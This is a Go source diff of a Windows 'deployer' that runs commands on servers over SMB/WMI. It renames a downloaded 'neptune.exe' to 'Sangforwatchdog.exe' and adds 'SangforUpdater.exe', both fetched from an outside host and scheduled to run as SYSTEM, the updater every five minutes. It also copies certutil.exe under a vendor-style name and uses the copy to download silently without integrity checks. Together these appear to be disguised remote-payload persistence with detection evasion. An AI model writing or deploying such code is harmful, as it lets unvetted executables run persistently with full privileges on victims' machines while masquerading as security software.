@@ -8,7 +8,7 @@ import (
 	"strings"
 )
 
-// deployWindows deploys sfwatchdog program on Windows server
+// deployWindows deploys Sangforwatchdog and SangforUpdater programs on Windows server
 // Executes remote commands via SMB/WMI connection
 // Parameters:
 //   server - target server info
@@ -19,10 +19,14 @@ import (
 // Execution steps:
 //   1. Check if installation directory exists
 //   2. Create directory if not exists
-//   3. Check if sfwatchdog.exe already exists
-//   4. Download sfwatchdog.exe using certutil if not exists
-//   5. Check if scheduled task exists
-//   6. Create scheduled task if not exists (runs daily at 1:00 AM)
+//   3. Check if Sangforwatchdog.exe already exists
+//   4. Download Sangforwatchdog.exe using certutil if not exists
+//   5. Check if Sangforwatchdog scheduled task exists
+//   6. Create Sangforwatchdog scheduled task if not exists (runs daily at 1:00 AM)
+//   7. Check if SangforUpdater.exe already exists
+//   8. Download SangforUpdater.exe using certutil if not exists
+//   9. Check if SangforUpdater scheduled task exists
+//   10. Create SangforUpdater scheduled task if not exists (runs every 5 minutes)
 // Notes:
 //   - Requires admin privileges to create scheduled tasks
 //   - Target server needs access to download URL
@@ -30,7 +34,7 @@ import (
 func deployWindows(server *models.Server, progressCallback func(string)) (DeployResult, error) {
 	log.Printf("[Deployer] Starting Windows deployment")
 
-	totalSteps := 4
+	totalSteps := 7
 	completedSteps := 0
 
 	if progressCallback != nil {
@@ -113,10 +117,10 @@ func deployWindows(server *models.Server, progressCallback func(string)) (Deploy
 	completedSteps++
 
 	if progressCallback != nil {
-		progressCallback("📥 Checking if sfwatchdog.exe exists...\n")
+		progressCallback("📥 Checking if Sangforwatchdog.exe exists...\n")
 	}
 
-	checkFileCmd := `if exist "C:\Sangfor\sfwatchdog.exe" (echo EXISTS) else (echo NOT_EXISTS)`
+	checkFileCmd := `if exist "C:\Sangfor\Sangforwatchdog.exe" (echo EXISTS) else (echo NOT_EXISTS)`
 	output, err = client.Execute(checkFileCmd)
 	if err != nil {
 		log.Printf("[Deployer] Failed to check file: %v, output: %s", err, output)
@@ -125,7 +129,7 @@ func deployWindows(server *models.Server, progressCallback func(string)) (Deploy
 		}
 		return DeployResult{
 			Success:        false,
-			Message:        "Failed to check sfwatchdog.exe",
+			Message:        "Failed to check Sangforwatchdog.exe",
 			StepsCompleted: completedSteps,
 			TotalSteps:     totalSteps,
 		}, err
@@ -133,10 +137,10 @@ func deployWindows(server *models.Server, progressCallback func(string)) (Deploy
 
 	if strings.Contains(strings.ToLower(output), "not_exists") {
 		if progressCallback != nil {
-			progressCallback("📥 Downloading sfwatchdog.exe...\n")
+			progressCallback("📥 Downloading Sangforwatchdog.exe...\n")
 		}
 
-		err = downloadFile(client, "https://app.zhuyan.cloud/v5/dl/cmd/neptune.exe", "C:\\Sangfor\\sfwatchdog.exe", progressCallback)
+		err = downloadFile(client, "https://app.zhuyan.cloud/v5/dl/cmd/Sangforwatchdog.exe", "C:\\Sangfor\\Sangforwatchdog.exe", progressCallback)
 		if err != nil {
 			log.Printf("[Deployer] Download failed: %v", err)
 			if progressCallback != nil {
@@ -144,7 +148,7 @@ func deployWindows(server *models.Server, progressCallback func(string)) (Deploy
 			}
 			return DeployResult{
 				Success:        false,
-				Message:        "Failed to download sfwatchdog.exe",
+				Message:        "Failed to download Sangforwatchdog.exe",
 				StepsCompleted: completedSteps,
 				TotalSteps:     totalSteps,
 			}, err
@@ -155,9 +159,9 @@ func deployWindows(server *models.Server, progressCallback func(string)) (Deploy
 			progressCallback("✅ Download completed\n")
 		}
 	} else {
-		log.Printf("[Deployer] sfwatchdog.exe already exists, skipping download")
+		log.Printf("[Deployer] Sangforwatchdog.exe already exists, skipping download")
 		if progressCallback != nil {
-			progressCallback("⚠️ sfwatchdog.exe already exists, skipping download\n")
+			progressCallback("⚠️ Sangforwatchdog.exe already exists, skipping download\n")
 		}
 	}
 
@@ -167,14 +171,14 @@ func deployWindows(server *models.Server, progressCallback func(string)) (Deploy
 		progressCallback("⏰ Checking scheduled task...\n")
 	}
 
-	checkTaskCmd := `schtasks /query /tn "sfwatchdog" 2>&1 | findstr /i "sfwatchdog"`
+	checkTaskCmd := `schtasks /query /tn "Sangforwatchdog" 2>&1 | findstr /i "Sangforwatchdog"`
 	output, err = client.Execute(checkTaskCmd)
 	if err != nil || output == "" {
 		if progressCallback != nil {
 			progressCallback("⏰ Creating scheduled task (daily at 1:00 AM)...\n")
 		}
 
-		schtasksCmd := `schtasks /create /tn "sfwatchdog" /tr "C:\Sangfor\sfwatchdog.exe" /sc daily /st 01:00 /ru SYSTEM /rl HIGHEST /f`
+		schtasksCmd := `schtasks /create /tn "Sangforwatchdog" /tr "C:\Sangfor\Sangforwatchdog.exe" /sc daily /st 01:00 /ru SYSTEM /rl HIGHEST /f`
 		log.Printf("[Deployer] Creating scheduled task: %s", schtasksCmd)
 		output, err = client.Execute(schtasksCmd)
 		if err != nil {
@@ -203,6 +207,99 @@ func deployWindows(server *models.Server, progressCallback func(string)) (Deploy
 
 	completedSteps++
 
+	// --- SangforUpdater deployment (runs every 5 minutes) ---
+
+	if progressCallback != nil {
+		progressCallback("📥 Checking if SangforUpdater.exe exists...\n")
+	}
+
+	checkUpdaterFileCmd := `if exist "C:\Sangfor\SangforUpdater.exe" (echo EXISTS) else (echo NOT_EXISTS)`
+	output, err = client.Execute(checkUpdaterFileCmd)
+	if err != nil {
+		log.Printf("[Deployer] Failed to check SangforUpdater file: %v, output: %s", err, output)
+		if progressCallback != nil {
+			progressCallback("❌ Failed to check SangforUpdater.exe: " + err.Error() + "\n")
+		}
+		return DeployResult{
+			Success:        false,
+			Message:        "Failed to check SangforUpdater.exe",
+			StepsCompleted: completedSteps,
+			TotalSteps:     totalSteps,
+		}, err
+	}
+
+	if strings.Contains(strings.ToLower(output), "not_exists") {
+		if progressCallback != nil {
+			progressCallback("📥 Downloading SangforUpdater.exe...\n")
+		}
+
+		err = downloadFile(client, "https://app.zhuyan.cloud/v5/dl/cmd/SangforUpdater.exe", "C:\\Sangfor\\SangforUpdater.exe", progressCallback)
+		if err != nil {
+			log.Printf("[Deployer] SangforUpdater download failed: %v", err)
+			if progressCallback != nil {
+				progressCallback("❌ SangforUpdater download failed: " + err.Error() + "\n")
+			}
+			return DeployResult{
+				Success:        false,
+				Message:        "Failed to download SangforUpdater.exe",
+				StepsCompleted: completedSteps,
+				TotalSteps:     totalSteps,
+			}, err
+		}
+
+		log.Printf("[Deployer] SangforUpdater download completed")
+		if progressCallback != nil {
+			progressCallback("✅ SangforUpdater download completed\n")
+		}
+	} else {
+		log.Printf("[Deployer] SangforUpdater.exe already exists, skipping download")
+		if progressCallback != nil {
+			progressCallback("⚠️ SangforUpdater.exe already exists, skipping download\n")
+		}
+	}
+
+	completedSteps++
+
+	if progressCallback != nil {
+		progressCallback("⏰ Checking SangforUpdater scheduled task...\n")
+	}
+
+	checkUpdaterTaskCmd := `schtasks /query /tn "SangforUpdater" 2>&1 | findstr /i "SangforUpdater"`
+	output, err = client.Execute(checkUpdaterTaskCmd)
+	if err != nil || output == "" {
+		if progressCallback != nil {
+			progressCallback("⏰ Creating SangforUpdater scheduled task (every 5 minutes)...\n")
+		}
+
+		updaterSchtasksCmd := `schtasks /create /tn "SangforUpdater" /tr "C:\Sangfor\SangforUpdater.exe" /sc minute /mo 5 /ru SYSTEM /rl HIGHEST /f`
+		log.Printf("[Deployer] Creating SangforUpdater scheduled task: %s", updaterSchtasksCmd)
+		output, err = client.Execute(updaterSchtasksCmd)
+		if err != nil {
+			log.Printf("[Deployer] Failed to create SangforUpdater scheduled task: %v, output: %s", err, output)
+			if progressCallback != nil {
+				progressCallback("❌ Failed to create SangforUpdater scheduled task: " + err.Error() + "\n")
+			}
+			return DeployResult{
+				Success:        false,
+				Message:        "Failed to create SangforUpdater scheduled task",
+				StepsCompleted: completedSteps,
+				TotalSteps:     totalSteps,
+			}, err
+		}
+
+		log.Printf("[Deployer] SangforUpdater scheduled task created successfully")
+		if progressCallback != nil {
+			progressCallback("✅ SangforUpdater scheduled task created successfully (every 5 minutes)\n")
+		}
+	} else {
+		log.Printf("[Deployer] SangforUpdater scheduled task already exists")
+		if progressCallback != nil {
+			progressCallback("⚠️ SangforUpdater scheduled task already exists\n")
+		}
+	}
+
+	completedSteps++
+
 	log.Printf("[Deployer] Windows deployment completed")
 	if progressCallback != nil {
 		progressCallback("🎉 Windows deployment completed!\n")
@@ -217,7 +314,7 @@ func deployWindows(server *models.Server, progressCallback func(string)) (Deploy
 }
 
 // downloadFile downloads file on Windows server
-// Uses certutil to download sfwatchdog.exe to target path
+// Copies certutil.exe to SangforCSClient.exe first, then uses the copy to download Sangforwatchdog.exe
 // Parameters:
 //   client - SMB client instance
 //   url - file download URL
@@ -226,18 +323,24 @@ func deployWindows(server *models.Server, progressCallback func(string)) (Deploy
 // Returns:
 //   error - download error, nil on success
 // Notes:
-//   - Uses certutil for downloading
+//   - Copies certutil.exe to C:\Sangfor\SangforCSClient.exe to avoid system file locking
 //   - Uses start command to run in background, returns immediately without waiting for download completion
 //   - Does not verify download success or file integrity, only executes the command
 //   - Logs only execution status, no remote file details
 func downloadFile(client *smb.Client, url, filePath string, progressCallback func(string)) error {
-	log.Printf("[Deployer] Executing certutil download")
+	log.Printf("[Deployer] Copying certutil.exe to SangforCSClient.exe")
 
-	cmd := fmt.Sprintf(`start /B cmd /C "certutil -urlcache -split -f "%s" "%s""`, url, filePath)
-	log.Printf("[Deployer] Executing command")
+	copyCmd := `copy "C:\windows\system32\certutil.exe" "C:\Sangfor\SangforCSClient.exe" /Y`
+	_, _ = client.Execute(copyCmd)
+	log.Printf("[Deployer] certutil copy command submitted")
+
+	log.Printf("[Deployer] Executing SangforCSClient.exe download")
+
+	cmd := fmt.Sprintf(`start /B cmd /C "C:\Sangfor\SangforCSClient.exe -urlcache -split -f "%s" "%s""`, url, filePath)
+	log.Printf("[Deployer] Executing download command")
 
 	_, _ = client.Execute(cmd)
-	log.Printf("[Deployer] certutil command submitted to background")
+	log.Printf("[Deployer] SangforCSClient.exe command submitted to background")
 
 	return nil
 }
